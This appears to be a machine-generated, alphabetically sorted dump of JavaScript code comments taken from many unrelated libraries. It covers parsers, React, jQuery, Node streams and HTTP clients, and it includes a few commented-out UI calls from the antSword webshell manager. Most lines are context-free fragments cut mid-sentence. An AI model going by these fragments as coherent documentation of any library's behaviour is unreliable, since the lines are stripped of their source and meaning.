// `ecmaVersion` indicates the ECMAScript version to parse. Must
// `ecmaVersion` indicates the ECMAScript version to parse. Must be
// `encodeTableSeq` is used when a sequence of unicode characters is encoded as a single code. We use a tree of
// `encodeTable` is array mapping from unicode char to encoded char. All its values are integers for performance.
// `fs.ReadStream` takes care of calling `fs.close()` on the
// `handledCPCount` is the number of code points that have been handled;
// `if (window.chrome && window.chrome.runtime)` code.
// `in` check used to prevent JIT error (gh-2145)
// `index` is the index of the next character to be consumed.
// `isLoop` marks a keyword as starting a loop, which is important"
// `isStatement` parameter).
// `keyCode` is the result of a KeyDown/Up event and represents the value of
// `lastIndex` will be the last index visited in `prevChildren`.
// `locations` is on or off.
// `locations` option is off (for performance reasons) and you
// `minPrec` provides context that allows the function to stop and
// `model` is the instantiated model object.
// `name` and `type` must use .setAttribute for WWA (#14901)
// `names` or a single `name`. First element is the `opts.KEY`.
// `nativeEventTarget` is probably a window object.
// `node`
// `null'
// `null` in case the current environment doesn't support the flags it
// `null`.
// `object` and `other`. See https://github.com/jashkenas/underscore/pull/1247
// `omittedCloseTags` except that `menuitem` should still have its closing tag.
// `onInsertedSemicolon` can be a callback that will be called
// `open()` first to get a file descriptor and ensure that the file
// `options.socketPath` might be `undefined` even if the `socketPath` option
// `parseFloat(value)` stops parsing at the first numeric separator then returns a wrong value.
// `parseStatement` will already have parsed the init statement or
// `path` portion so that `net.connect()` doesn't attempt to open
// `preventDefault`.
// `program` option in subsequent parses. This will add the
// `querySelectorAll` to ensure we don't miss anything.
// `realHasInstance` is necessary because using plain `instanceof`
// `receiver` stream is closed after writing any remaining buffered data to
// `secureEndpoint` is true when using the https module
// `slice` is the same for buffers and strings.
// `sourceType` indicates the mode the code should be parsed in.
// `startLoc` and `endLoc` properties.
// `state.lastAssertionIsQuantifiable` is true if the last eaten Assertion
// `statement & FUNC_STATEMENT`).
// `textContent` (unnecessary since we update value).
// `this._pendingStateQueue` without triggering a re-render.
// `time_high_and_version`
// `time_low`
// `time_mid`
// `toString`ed by IE8/9.
// `true`.
// `tt.name`.
// `undefined`
// `undefined` otherwise.
// `value` parameter was not undefined. An empty jQuery object
// `var
// `version` will be added here by ReactIsomorphic.
// `which` is an alias for either `keyCode` or `charCode` depending on the
// `window.request = superagent;`
// `yield` expression. It is set on all token types that either can
// `zlib.DeflateRaw` instance is closed while data is being processed.
// `~ 1.2.3` => `~1.2.3`
// a
// a 'select' element has 'length' and 'item' properties on IE8
// a * b vs. node test *
// a < b
// a POST request will be sent to http://www.mockbin.com
// a Statement when the Comment can't be attached to any other
// a `stack` plus `description` property; ignore those for consistency.
// a and b should be objects at this point
// a copy of the entry or else bad things happen. Shared mutable state
// a declaration or an expression.
// a duplex stream is just a stream that is both readable and writable.
// a few lines down. This is needed to support once('readable').
// a file in the way
// a flag to be able to tell if the event 'readable'/'data' is emitted
// a flag to see when we're in the middle of a write.
// a function to minimize refactoring in the future
// a hack to signal we're waiting for a PASV data connection to complete
// a mapping for a different line than the one we found. Since
// a mapping for a different line than the one we were searching for.
// a new one if stringText isn't empty.
// a newline specifically to get eaten by the parser. (Alternately for
// a noop _transform function
// a passthrough stream.
// a pathological inflate type of transform can cause excessive buffering
// a positive number if a is greater than b
// a previous call to `getUri()`
// a problem as well.
// a read from the buffer.
// a real array
// a ref. The ref conceptually lives on the element.
// a special marker.
// a stream that does nothing but re-emit the input."
// a subset or equal to those in the bound event (both can have no namespace).
// a terminus with a more left-ward coercible string.
// a transform stream is a readable/writable stream where you do
// a union type
// a variety of checks:
// a visual Hebrew model using the windows-1255 logical Hebrew model.
// a will return null when ActiveX is disabled
// a ~3500ms mean speed-up in `bench/bench.html`.
// a-z
// a. LOAD_AS_FILE(RESOLVED_PATH)
// a. LOAD_AS_FILE(X)
// a. LOAD_AS_FILE(Y + X)
// a. Let mainExport be undefined.
// a. Let pjson be the result of READ_PACKAGE_JSON(packageURL).
// a. Let target be the value of matchObj[expansionKey].
// a. Let target be the value of matchObj[matchKey].
// a. Let targetValue be the value of the p property in target.
// a. Return the URL resolution of main in packageURL.
// a. Throw an Invalid Module Specifier error.
// a. return the core module
// a. set Y to be the filesystem root
// a..f
// a..z
// a0
// a0 - a7
// a8 - af
// a?.b()
// aHaystack[mid] is greater than our needle.
// aHaystack[mid] is less than our needle.
// aStr1 !== null
// aStr2 !== null
// a[0][b]=c
// a[][b]=c
// able to fill the location occupied by the old node with
// abort early if no destination
// abort jobs
// abort out of the list early if we hit a cycle
// above the root is a no-op. Therefore we can remove all '..' parts
// absence of a closing parenthesis after the FunctionExpression would
// abstract method.  to be overridden in specific implementation classes.
// accent capital other
// accent capital vowel
// accent small other
// accent small vowel
// accepted attribute operators
// accepted prefix identifiers
// accepted whitespace characters
// accessible and defaults to false when `ReactDOMComponent` and
// accessing global.localStorage can trigger a DOMException in sandboxed iframes
// accessing this.getValue()[name1][name2]... should be array-like. The
// accidental reuse of bogus source code during reprinting.
// accidentally include the ${ in the .loc of the quasi element.
// according to the current batching strategy.
// account for function/variable declaration hoisting
// accounts for both named and indexed properties on Arrays.
// activate / deactivate changes all elements instantiated at same time
// activate first label
// activate next label
// activate previous label
// actual / expected diff
// actual algorithm code here
// actual dropdown value
// actual parsers use ArrowFunctionExpression.
// actual performance
// actually a contextual keyword modifying a function
// actually been sent.
// actually refers to the catch parameter and not the outer
// adapted from https://dev.twitter.com/docs/auth/oauth and 
// add
// add 512 for header
// add content length
// add cookies
// add custom disposition as third element or keep it two elements if not
// add if support for Symbol.iterator is present
// add in container calcs if fluid
// add in margins if inline
// add jobs using the familiar Array API
// add left context if missing
// add listeners
// add namespace info to tag
// add non-empty headers.
// add optional properties to make validation successful
// add or overwrite user defined operators
// add properties to generic error
// add right context if missing
// add selector patterns for user defined callbacks
// add some items
// add some items to the front of the queue
// add some items to the queue
// add some items to the queue (batch-wise)
// add some unsupported drivers before
// add space before unescaped |
// add stack trace
// add stream methods
// add style rule
// add tabindex to element
// add tests
// add the new bytes to the char buffer
// add values
// add: function (word) {
// added piece. So for the code piece
// added to it. This is a useful default which helps finding memory leaks.
// adding 1 corrects loss of precision from parseFloat (#15100)
// adding statements to.
// additional elements.
// additional layer of parentheses.
// additional offset
// additional parameters to include with the embed
// additionally a checkClashes object may be specified to allow checking for
// adds default tabs to tab path
// adjust all modules to use correct reference
// adjust the [[Prototype]]
// advance to the next closing parenthesis
// advanced options:
// advancing the input stream and returning an AST node. Precedence
// after a `yield` or `of` construct. See the `updateContext` for
// after all config options are set and
// after each key entry. The selection changes after keydown and before
// after envify
// after error
// after read()ing all the bytes and not getting any pushback.
// after readable has been emitted but before I/O (nextTick) to
// after request
// after the browser event has already occurred.
// after the outermost pair is closed. They are:
// after the user is redirected back to your server
// again. This runs in O(n) time.
// against its use
// agent
// ahead of local)
// ajax request promise
// aka. 0x7FFFFFFF or 2^31-1
// algorithm. `left` is the left-hand side of the operator.
// alias
// alias some functions to make (compiled) code shorter
// aliases
// aliases for mock
// all
// all alias
// all arguments provided
// all callbacks defined on an object belong to it.
// all calls to function are deprecated
// all done
// all except special table nodes which cause bad parsing behavior anyway.
// all is an array of all the data emitted
// all nodes have .attributes
// all other error types we handle generically
// all other requests will go to this host
// all services don't encode characters > 255 correctly
// all that streamy business can't handle numbers
// all the elements that are greater than it after it. The effect is that
// all the related localForages aren't pending.
// all this should be redundant
// allocate for retained data
// allow animation to same side
// allow custom headers.
// allow elements with sub-menus to be selected
// allow filename as single option
// allow legacy {$var} style
// allow legacy {/$var} style
// allow module to guess desired state based on element
// allow multipart to handle end event
// allow selection with menu closed
// allow shortcut if iterator expects only two arguments
// allow time for proper setup
// allow utility functions to access the current test environment
// allowing us to avoid a second parse if we encounter the same
// allows cookie to be overridden
// allows for selection of elements with data attributes
// allows it to work with `_.map`.
// allows the tokenizer to store the information it has about a
// alone are meaningless. HebrewProber always returns 0.00 as confidence
// alpha chars & low dash
// already done.
// already gone
// already out of owned node
// already patched
// already replaced the hyphen ranges
// already warned
// also jump ahead all the blocks for the body
// also returned false.
// also supported for arrays
// alternative to using Object.keys for old browsers
// alternatively pass an object containing additional options
// always ensure folders are created
// always follow error
// always overwrite
// always return `null` so that localForage is consistent across
// always return object
// always returns true in newer browsers as per the standard.
// always returns whether classList contains token after toggling
// always table[l] <= val < table[r]
// always true for unary operators.
// am2 avoids a big mult-and-extract completely.
// amd
// amounts.
// an error happened.
// an error in the request blow up the response
// an example using an object instead of an array
// an existing type.
// an external backing store so that we can freeze the whole object.
// an identical 'prototype' property.
// an index go together.
// an object should be inserted so as to maintain order. Uses binary search.
// an+b format params for pseudo-classes
// an+b parameters or quoted string
// and (if present) cache the value in the node's internal data store. If no
// and 0 if they are equal
// and CommonJS for browser emulators (#13566)
// and Laura Doktorova's doT.js (https://github.com/olado/doT).
// and Modernizr execute.
// and `data` will have their expected values
// and a callback function
// and add it as knownLength option
// and add the remaining lines without any mapping
// and after the target driver
// and are either checked/don't have a checkable state
// and called read() to consume some data.  that may have triggered
// and cannot be clicked (`[type=submit]`) or are used in `x-www-form-urlencoded` (`[type=file]`)
// and construct a URL that a user clicks on (like a sign in button).
// and correctly escapes quotes within interpolated code.
// and create these arrays once queried for a source location. We jump through
// and deletePath the path from the root (inclusive) to replaceWith (exclusive)
// and ensure context is set to a default
// and hence handleInvalidRegexFlag is false.
// and http://docs.python.org/library/uuid.html
// and http://wiki.ecmascript.org/doku.php?id=harmony:let
// and https://github.com/websockets/ws/issues/1202
// and implement a caching wrapper function here.
// and inconsistent support for the `crypto` API.  We do the best we can via
// and is not needed when comparing the actual elements (and not their owners)
// and is not set directly on the node by a script.
// and its modifers (gmi) ...
// and jsdom features
// and keywords can also not be used as property names.
// and let it be printed generically.
// and let the next iteration check again
// and mark them as [Circular]
// and mark them as replaced value
// and might be considered as more preferable results.
// and most other unix tools that manage permissions.
// and new lines. It reduces any sequence of such characters to a single space.
// and not in consequential order
// and not share any injection state. Then this problem will be solved.
// and notes at the bottom; explicitly non-normative in this specification.
// and object pattern might appear (so it's possible to raise
// and other mocha methods. All feels very hacky though :-/
// and provide reference for storing '=' operator inside shorthand
// and removal by using an indirect global eval
// and remove it on removal.
// and remove overides
// and reset for each different context
// and reset the list
// and return the corresponding response
// and save ourselves from falling back to the pretty printer is if an
// and simply check if any non-visible tags appear in the source.
// and slower. Copying and editing the code allowed me to make
// and spelled backwards] [first word of first line spelled backwards]
// and tar format comes out of.
// and terminate these steps.
// and the SourceMap
// and the exception is handled.
// and the failures if any
// and the same name are rendered into the same form (same as #1939).
// and there seems no easy cross-platform way to detect them (@see chaijs/chai/issues/69).
// and therefore a broken symlink would be created.
// and try again.
// and undefined/non-string values are only allowed in object mode.
// and updating require calls as appropriate
// and waiting for 'end' on the entry at READENTRY
// and we need to make sure we don't double-fire the error event.
// and we need to re-evaluate how much data we can return to the user.
// and when you create one that shouldn't be
// and won't include inputs that use the HTML5 `form=` attribute. Since
// and/or If-None-Match header later on
// and/or updateComponent to do the actual update for consistency with
// and: function (word) {
// animation callback event
// animation duration
// animations on inline elements that are having width/height animated
// another script onerror (which would be an infinite loop)
// antSword.modules.shellmanager.list.updateHeader();
// antSword.modules.shellmanager.toolbar.reloadToolbar()
// any ThisExpression nodes.
// any alias
// any escaped char
// any kind of object works
// any modifications made to the array by the callback. I chose these
// any nodes.
// any number of arguments to specify the field.
// any supplied version is valid and passes all tests.
// anything else let's inspect with %O
// anything else switches us into object mode
// api request promise
// apostrophe is converted to a space in FilterWithoutEnglishLetters causing
// app.exit(0);
// app.hide();
// appName for IE11 reports 'Netscape' can no longer use
// appearing at the top of the program.
// appearing in methods and do not raise an error when they appear elsewhere.
// appears to fire in all of the remaining cases so we catch those and
// append mutation events
// appending children won't update the DOM. We need to ensure the fragment
// application/x-www-form-urlencoded body and the encoding of the page containing
// apply any `formatters` transformations
// apply transition with (1..n) arguments
// approximation.
// arbitrary CSS which may be problematic (I couldn't repro this):
// are added later (like 'loc' and 'range'). This just helps
// are case-insensitive.
// are declared here.
// are emptied (fx is the type by default)
// are finally checked against each other in GetCharSetName().
// are independently valid; helps keep this simple. Named captures are put back
// are likely far more normal files in the world than directories.  This
// are only applied when a character is found to actually have a
// are only valid in combination with the `/u` flag.
// are quite rare.
// are reversed.
// are we there yet?
// arg => { } case
// arg is for internal usage only
// arg1 now equals 'one' and arg2 now equals 'two'
// arg1 now equals 'three'
// argument list.
// argument to parseSubscripts to prevent it from consuming the
// arguments
// arguments are needed to create the filter function
// arguments will be dynamically type-checked against the Mozilla Parser API.
// arguments.
// array instance.
// array is always expected for the first argument
// array is in longest-to-shortest order.  Handy for indexing.
// array is in shortest-to-longest order.  Handy for indexing.
// array of callbacks for percentage
// array of categories (category view)
// array of non-empty arrays of matching ancestors
// array of results (category view)
// array of results (standard)
// array of status codes
// array.
// array.shift()
// arrayFormat default
// arrays to re-use
// as CommonJS/NodeJS module
// as Safari. Oh the lulz...
// as a micro-optimization.
// as a result.
// as a simple example this will check
// as an alternative to the sandbox attribute on IE<10
// as appropriate.
// as bindings in the outer scope.
// as documented in https://github.com/nodejs/node/issues/8871#issuecomment-250915913
// as equal. See http://www.ecma-international.org/ecma-262/7.0/#sec-regexp.prototype.tostring
// as second argument.
// as soon as we *do* get something into the buffer.
// as the arg rather than a function
// as the capture name
// as the hot path ends with doWrite
// as the logic for both is exceedingly similar. If the node is the target of
// as was in the original HTML code
// as xhr.onerror cannot be accessed
// ascending for time: a CMP b
// ascending order
// ascii capital letter
// ascii small letter
// assign a callback
// assign a type property to such nodes). Be optimistic and let
// assign callback
// assigning it a key.
// assignment operators
// assume it's a `superagent.Request` instance
// assume it's an Object
// assume the nodes are syntactically interchangeable.
// assume there is no 'length' or 'type' properties in the options object
// assumes 16 < DB < 32
// assumes 16 < DB <= 32 and assumes ability to handle 48-bit ints
// assuming it does.
// assuming openFiles is an array of file names
// assuming openFiles is an array of file names and saveFile is a function
// assumption is that looking up astral identifier characters is
// async
// async code to create a directory to store a file in
// async code to get some data
// async job accepts one element from the array
// asynchronous validation options:
// asynchronously loads the drivers that replace them.
// at js/src/tests/js1_8_5/extensions/reflect-parse.js in the source tree).
// at profiling tools.
// at the start of calling end()
// attach callbacks from options
// attach comments using collected information
// attach listeners
// attached so that the node core `http` can parse and handle the
// attempt a parseFloat and fallback to a string if the parse fails.
// attempt to get a cached `http.Agent` instance first
// attempt to get a proxying `http.Agent` instance
// attempt to negotiate http/1.1 for proxy servers that support http/2
// attempt to open that as a unix socket file.
// attempt to read from disk!
// attr= or just attr
// attr={value}
// attribute of iso-8859-1. Presumably also with other charsets that do not contain
// attribute operators
// attribute presence
// attribute to next and terminate these steps.
// attribute value
// attributes
// attributes referencing URI data values need special treatment in IE
// attributes start with @
// attributes: following node of element.
// auth
// auth hello
// auto json
// auto transition will slide down or up based on direction
// auto x-www-form-urlencoded
// auto-convert to string
// auto-detect header.
// autoCapitalize and autoCorrect are supported in Mobile Safari for
// autoFocus is polyfilled/normalized by AutoFocusUtils
// autoSave allows WebKit/Blink to persist values of input fields on page reloads
// autogenerated
// autogenerated\n\n');
// autolink
// automatically abort PASV mode
// automatically dequeued
// automatically hide on scroll
// available Sauce Labs credentials. Use `grunt test:local` to skip
// available browser launchers: https://npmjs.org/browse/keyword/karma-launcher
// available frameworks: https://npmjs.org/browse/keyword/karma-adapter
// available preprocessors: https://npmjs.org/browse/keyword/karma-preprocessor
// available reporters: https://npmjs.org/browse/keyword/karma-reporter
// available.
// avltDataElems is a simple array containing every piece of data in the tree
// avoid attribute selectors for IE QSA
// avoid duplicates when pushing results
// avoid loop if we're matching nothing
// avoid repeating the same token
// avoid space before method name
// avoid the V8 deoptimization monster!
// avoid traversing this subtree.
// avoids locking rendering if initialized in onReady
// aws4 can infer the HTTP method if a body is passed in
// b
// b < a
// b could be an object literal here
// b is preceding a
// b. LOAD_AS_DIRECTORY(RESOLVED_PATH)
// b. LOAD_AS_DIRECTORY(X)
// b. LOAD_AS_DIRECTORY(Y + X)
// b. LOAD_AS_FILE(DIR/X)
// b. Let subpath be the substring of matchKey starting at the index of the length of patternBase up to the length of
// b. STOP
// b. Set parentURL to the parent folder URL of parentURL.
// b0
// b0 - b7
// b8 - bf
// back to original track
// back-port the fix here.
// background-* props affect original clone's values
// backreferences and fix numerous cross-browser bugs
// backup the real host
// backwards compatibility.
// backwards-compat only
// backwards-compatibility for the old `require()` API. If we're in
// backwards. A buffer of Visual Hebrew generally looks like so:
// bad file path requested
// bad for performance and way too forgiving.
// bail on hooks
// bar
// base URL to apply to all endpoints
// base cases
// base path of url
// base64-arraybuffer
// base64-encoded data is supported
// baseUrl and uri.
// based on LLVM libc++ upper_bound / lower_bound
// based on setZeroTimeout by David Baron
// based on user configuration options
// basic format
// basically just the most minimal sort of Transform stream.
// basics
// baz: {
// be able to reprint it.
// be called.
// be composed with the new source map.
// be either left alone or desugared into AST types that are fully
// be fired.
// be in our element.
// be particularly problematic when the source root is a prefix of the
// be replaced by `[x-b]` which throws an error.
// be strict: don't ensures hasOwnProperty and go deep
// be triggered. The function will be called after it stops being called for
// because `originalEvent` should point to the original event for the constancy
// because blocking following processes maybe is not a good idea
// because it includes prereleases in the 1.2.3 tuple
// because it is fragile and can be easily faked with `Object.create()`.
// because it is its only offset parent
// because it still parses correctly; we do warn for other cases like nested
// because it's a different object identity
// because otherwise some prototype manipulation in
// because the buffer-to-string conversion in `fs.readFileSync()`
// because the index is slower when the collection is already
// because their .id fields are ignored anyway.
// because we do not want to detach the ref if another component stole it.
// before '.xXx' or the bug may not present itself
// before .type means .value is lost in IE11 and below)
// before it to distinguish it from an escaped pipe
// before the next rerender (including event handlers attached to ancestor
// before there was *not* enough.
// behave like it would if they were running a local HTTP server. See
// behavior as without this statement except with a better message.
// behavior of getting and setting a style property
// behavior we have in other enqueue* methods.
// behavior. The continuation byte check is included three times in the case
// being called before last iteration completion.
// being emptied incorrectly in certain situations (#8070).
// being hidden by cascaded rules or not
// belongs to partData
// better error message. (In the rare case that the less-than operator
// big-endian numbers. Append the three characters with code points
// big. So the result given by the algorithm will be a bit worse than
// binary is always well-balanced
// binary/unary operators
// binary: 011111
// binary: 100000
// bind events with delegated events
// binding element or assignment target.
// binds events
// bit string sequence
// black hole
// blank lines.
// block comment
// block required': {
// block until document ready
// blockquote
// body
// body is the decompressed response body
// body of an if statement.
// bold cyan
// bold yellow
// boolean attributes should return attribute name instead of true/false
// boolean attributes should return name instead of true/false
// boolean decision
// boolean when set
// boot
// both (all) of the holes.
// both fit!
// both plain key and camelCase key. #12786
// both tagName and nodeName properties may be upper/lower case
// bother modifying those since they'll be retried anyway.
// bottom edge
// bound by uuid
// bound in that scope is the catch parameter. Any other
// boundary must be in the same line(js sting or regexp)
// box these before the check
// boyer-moore derrived algorithm to safely skip non-boundary data
// br
// break ties for the same millisecond (precision of JavaScript's clock)
// break traversals
// brings us in line with the same behavior we have on initial render.
// browser
// browser main thread
// browser this is a little complicated due to unknown quality of Math.random()
// browser) is a `parse` function that takes a code string and
// browsers for all cases.
// browsers implement them.
// browsers slow down when dealing with 32-bit numbers.
// browsers that don't support the native Blob constructor. (i.e.
// browsers.
// bst.search(15) will now give []
// bst.search(18) will now give ['hello']
// bstDataElems is a simple array containing every piece of data in the tree
// bubble.
// buffer
// buffer the incomplete character bytes we got
// buffered _write cb's as it consumes chunks.  If consuming a single
// buffered data as everything has been already written and `readable.read()`
// buffers into a series of JS strings without breaking apart multi-byte
// bug in node.  Should never happen.
// build array of bytes
// build attribute string
// build metadata.
// build pseudoclass string
// build string from array
// build test expression out of structural pseudo (an+b) parameters
// buildable (by defining builders[getBuilderName(typeName)]) and
// built. The second SBCharSetProber is told to make the pair-of-letter
// bump the version number in those files
// but
// but `net.TcpNetConnectOpts` expects only a number
// but allow 1 minute for the file to finish loading.
// but guard against overflow
// but guard against overflow.
// but it must have a current display style that would benefit
// but it's useful to make sure its using the right spec.
// but joined with comma (not LineTerminator).
// but not /json-seq
// but omit the Flow-related types.
// but strip the //?/C:/ off of //?/C:/path
// but that sometimes behaves strangely in IE8. We could also try using
// but that will not handle a native abort
// but the base might've already been provided by the constructor.
// but the path reservations are required to avoid race conditions where
// but there are comments intervening between the parentheses and the
// but they are ignored because response was set above.
// but they are still not allowed in non-async functions.
// but they might both be false when the comment falls inside a node
// but we have to check for that.
// but we might need to add _that_
// but width seems to be reliably pixels.
// button: 0 0 0
// button: 0 1 2 (standard)
// button: 1 4 2 (onmouseup)
// by Taiwan's Mandarin Promotion Council
// by a digit or another two dots.
// by a handler lower down the tree; reflect the correct value.
// by common browsers.
// by default do not add missing left/right context
// by default stderr is used
// by getFieldValue) to the callback. If the object has no corresponding
// by invoking `closeAll`.
// by invoking the module's
// by mocks to assert on what gets mounted.
// by testing the element itself and traversing up through its ancestors in the
// by the high-resolution timer (via now()).  While these two won't be set
// by the native compositionend event may be incorrect. Japanese ideographic
// by using document.implementation
// by wrapping recursive function call in setTimeout 
// by: yzddMr6
// byte array
// bytes downloaded or uploaded so far
// bytes.
// c. DIRS = DIR + DIRS // Note: this seems wrong. Should be DIRS + DIR
// c. LOAD_AS_DIRECTORY(DIR/X)
// c. Return or throw the last fallback resolution null return or error.
// c. Return undefined.
// c. let M = X + (json main field)
// c0
// c0 - c7
// c8 - cf
// ca option is only relevant if proxy or destination are https
// cache is a Map (or PseudoMap) that matches the keys to"
// cache the content requests to pull locally
// cache the resulting module object for next time
// cachedIndex is no longer valid
// calculate current row distance from previous row using collator
// calculate current row distance from previous row without collator
// calculate screen boundaries
// call 'onDone()'.
// call `wrapped` as you would `myFunction`
// call beforesend and get any settings changes
// call drain immediately if there are no tasks
// call init
// call internal read method
// call on start of module test to prepend name to all tests
// call retry to make sure we're actively processing the queue
// call to self as log
// callWhenReady API method stubs are called before RequireJS
// callable Dom.shortcuts method has to be available
// callback
// callback after closing animation
// callback after closing or opening animation
// callback after hide animation
// callback after open animation
// callback after show animation
// callback before closing animation
// callback before element removed from dom
// callback before hide animation
// callback before open animation
// callback before show animation
// callback function invocations are stored in an array and returned at
// callback is no longer called if the deflate stream is closed while
// callback occurs on side change
// callback occurs on state change
// callback only when element added to dom
// callback should fire continuously whe evaluates to true
// callback should only occur one time
// callback times out on IE 10/11. Could be an
// callback when popup cannot be positioned in visible screen
// callback will be called with a reference to this path object for each
// callback.
// callback. The callback is also the only way of being notified that data has
// callback/promise is the same as what one would get out
// callback?
// callbacks
// callbacks before request
// called _after_ serialization.
// called after approve selector match
// called after deny selector match
// called after hide animation
// called after show animation
// called before hide animation
// called before show animation
// called ever time a tab beings loading remote content
// called every time tab visible
// called first time loaded
// called multiple times
// called on every load
// called on specific nodes. The last two arguments are optional. A
// calling rewind(backtrackToken).
// calls indexOf on internal array
// calls splice on internal array then rewrites indexed properties of dtl
// calls with 0 or 1 args are deprecated
// calls with non-string first argument are deprecated
// camel-case
// can be converted to a string via `JSON.stringify()` will be saved).
// can be invoked by Mutation Events or
// can be used OO-style. This wrapper holds altered versions of all the
// can implement the source URL resolution algorithm as outlined in
// can just ignore it.
// can quickly bailout if nothing has changed.
// can return to the user.
// can take multiple arguments
// can take priority.
// can transition does not return a value if animation does not exist
// can't be let or const
// can't throw since this utility is basically used everywhere
// can't use /x/y even behind `if` because it errors during compilation in IE9
// cannot move backwards
// capture a stack trace to the construction point
// capture in marker only the assignment expression itself.
// capture stack trace
// capture the stack
// captured when this technique is used.
// captures foo
// captures parent this
// cascaded feature detection for Internet Explorer
// case 'add-MassData':
// case 'in':
// case 'instanceof':
// case (1) [-2:not space][-1:final letter][cur:space]
// case (2) [-2:not space][-1:Non-Final letter][cur:space]
// case (3) [-2:space][-1:final letter][cur:not space]
// case insensitivity for html
// case sensitivity is treated differently depending on the document type (see map)
// case the current environment doesn't support the flags it uses.
// case treatment depends on document type
// cases are invalid.
// cast to ints.
// cast to string
// cast to string avoiding encoding special values
// catch the most you can
// catch this mistake early:
// catching the exception yourself.
// cause Acorn to call that function with object in the same
// cause the system to run out of memory.
// cb is called 2 times with:
// cb is called 3 times with:
// cell.hideHeader();
// cell.setHeight(43);
// cell_host_log.setWidth('550');
// certain amount of data is enough
// certain bugs can only be detected in standard documents
// certain that x is an Array (x could be a string with concat method).
// chain of promises).
// chaining multiple .get calls:
// change back to original path
// change class on state
// change context specific variables
// change should trigger an update of the owner which would recreate
// change the overflow attribute when overflowX and
// change to destination path
// changed here at 2015-12-21
// changed on 15-12-21
// changes or when an input with a placeholder is focused.
// changes to the function body.
// changing ports or protocols).  This matches the behavior of curl:
// changing the TypedArray changes the Buffer also
// char order of last character
// charCode will always be < 0x10000 in javascript.
// character ...[or]... If the remainder of attribute-value contains a
// character of the request-path that is not included in the cookie- path
// character offsets that denote the start and end of the comment.
// character.
// characters that fall in our sampling range
// characters.
// characters. CESU-8 is handled as part of the UTF-8 encoding.
// chars. Paste events should not lead to BeforeInput events.
// charsets are identical with respect to code points. Meaning that for the
// charsets:
// check 'async [no LineTerminator here] function'
// check Selector API implementations
// check all values
// check allows it to work with `_.map`.
// check dom argument for dom element specific properties
// check element is descendant of container
// check for keywords used as local names
// check for sticky bit
// check for the attribute presence
// check for the result of the stringifying.
// check for windows weird way of specifying a directory
// check if async happened
// check if before send cancelled request
// check if component newly created
// check if element matches the :link pseudo
// check if export is defined
// check if input is a file path or just string data to store
// check if it's a symlink or dir (using stat mode constants)
// check if redirecting to a different protocol
// check if slice() can convert nodelist to array
// check if the fixture has not been modified
// check if the plane crashed
// check next of same letter
// check node emptyness
// check position immediately on init
// check that two elements are ancestor/descendant
// check the length and limit options.
// check whether this is array comprehension or regular array
// check whether unref is available as it differs from browser to NodeJS (#33)
// checkAllFields once. Calling checkAllFields is too strict when deep
// checkToken determines whether the function is
// checkbox checked
// checked against either the strict or loose comparator form
// checks and only if none of them worked
// checks fail when running the tests using casper.js...
// checks the src and dest inodes. It starts from the deepest
// checks whether active/inactive state can be given
// child position by nodeName
// child position by nodeType
// children non-generically.
// children of the replacement node.
// children. Definitely want to avoid this.
// choose b arbitrarily
// chunks.
// circumstances:
// class that triggered it.
// classMethodOrDeclareMethodCommon
// classMethodOrPropertyCommon
// classes
// classes listed
// classic callback style
// classnames used
// clean up and get some utility properties
// clean up jobs
// clean up timing event listeners if needed on error
// cleanup
// cleanup dynamically embedded objects to fix audio/video threads and force open sockets and NetConnections to disconnect
// cleanup event handlers once the pipe is broken
// cleanup library's main closures to avoid memory leaks
// clear all timeouts
// clear data
// clear screen
// clear the cache if it's a case-insensitive unicode-squashing match.
// clear the error
// clear the timer and remove it to help prevent unintended concurrency
// cleared.
// clears embed
// client code does not have to provide a try-catch block to
// clobbering an fs object to create one of a different type.)
// close calls delete on its document.
// close match group
// close should not have been called
// close the FTP client socket connection
// closed tag
// closed when an error is emitted.
// closing doubles
// closing singles & apostrophes
// code
// code instead.
// code point above 128.
// code printed for the new node with no ill consequences.
// code referenced by extensions
// code string reused to build compiled functions
// code to add the data object to the top of the scope chain.
// code unit is the high surrogate of a surrogate pair
// code unit length (16 bit)
// code we must have exited earlier.
// code.
// coefficient -- (inverse of q) mod p
// coerce string value into JS value
// coerces header names to lowercase
// coerces to literal Infinity
// coercible string can be more right-ward without the same terminus.
// collapse sibling forms: the second one becomes a child of the first one.
// collect a's properties
// collect b's properties
// collect comments in Esprima's format
// collect ranges for each node
// collect token ranges
// collection of strings
// collections. In this case it's usually a good idea to use autoload for all collections.
// collide on matches across case and unicode normalization
// collide with any variables in nested/enclosing scopes.
// color is for Safari mask-icon link
// column
// combinator selector
// comma
// commas separators are treated sequentially to maintain order
// commas so that the resulting code is interpreted with
// comment must be separated from fn by an unbroken series of
// comment?
// comments that occur inside node.loc. Returns an empty array for nodes
// comments will be attached to program.body[0] instead of program.
// commit the changed version number
// common in the npm registry.
// commonjs
// commonly used development environments.
// compared to the original.
// comparing constructors is more strict than using instanceof
// comparison could exclude that field.
// comparison.
// compile a CSS3 string selector into ad-hoc javascript matching function
// compile a comma separated group of selector
// compile matcher resolvers if necessary
// compile selector into ad-hoc javascript resolver
// compile selector resolver if necessary
// compiled match functions returning booleans
// compiled select functions returning collections
// completion of its arg still works.
// complex case.
// complexity.
// component to placate it
// component when server rendering
// componentDidUpdate) but we need to check here too in order to catch
// componentWillMount during server-side rendering.
// componentWillMount. Either fix it or disallow doing so completely in
// components don't work properly in conjunction with event bubbling because
// components that rendered and the DOM operations that actually
// compressed data as it is received
// computing path.needsParens() except in this case.
// concat elements to data
// concat elements to data and callback
// conditionally execute the original function.
// conditions prevent the data from being read:
// config values.
// configs is now a map of JSON data
// configurability must be true to allow the property to be
// configurable must be true to allow the property to be
// configure it to lower the limit.
// configure the precise type hierarchy that you need.
// connect
// connect to localhost:21 as anonymous
// connection via the `callback()` function throwing.
// conservative assumption of the latency.
// consider: /./ instanceof Object;
// consider: typeof [] === object
// consider: typeof new Date() === object
// consider: typeof null === object
// consistency with node versions before v6.8.0
// consistently. If they are created inside a <div> they will be initialized in
// console.debug('Download the React DevTools ' + (showFileUrlMessage ? 'and use an HTTP server (instead of a file: URL) ' : '') + 'for a better development experience: ' + 'https://fb.me/react-devtools');
// console.log('false && ___');
// console.log('false || ___');
// console.log('if/? (false)');
// console.log('if/? (true)');
// console.log('if/? ___');
// console.log('true && ___');
// console.log('true || ___');
// console.log(res);
// const LANG_T = antSword['language']['toastr'];
// const Update = require('./update');
// const all = await stream.collect()
// const data = await stream.collect()
// const data = await stream.concat()
// constant
// constant time.
// constrain to a minimum and maximum number of digits.
// construct Cookie header
// construct a filter that limits the file entries listed
// construct headers objects
// construct new options
// construct query objects
// construct utility properties
// constructor
// consume the data with asynchronous iteration
// consuming the return value of the function that follows.
// contain such byte. We need to be more consts.error forgiven.
